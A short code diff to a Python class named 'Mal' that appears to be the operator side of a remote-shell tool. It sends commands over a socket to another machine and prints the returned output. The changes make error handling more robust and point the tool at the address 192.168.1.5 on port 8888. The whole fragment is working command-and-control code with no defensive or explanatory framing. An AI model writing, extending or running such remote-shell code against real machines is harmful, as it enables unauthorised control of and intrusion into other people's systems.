@@ -44,10 +44,13 @@ class Mal():
                     self.c.send(cmd.encode())
                     output = self.c.recv(1024)
                 except:
-                    output = b"[-]Error"
+                    output = b"[-]Error.SERVER.SEND"
                 
                 while(len(output)):
-                    print(output.decode(),end="")
+                    try:
+                        print(output.decode(),end="")
+                    except:
+                        print(output,end="")
                     self.c.settimeout(0.5)
                     try:
                         output = self.c.recv(1024)
@@ -56,6 +59,6 @@ class Mal():
                         break
 
 
-Mal("0.0.0.0",8888)
+Mal("192.168.1.5",8888)
         
 
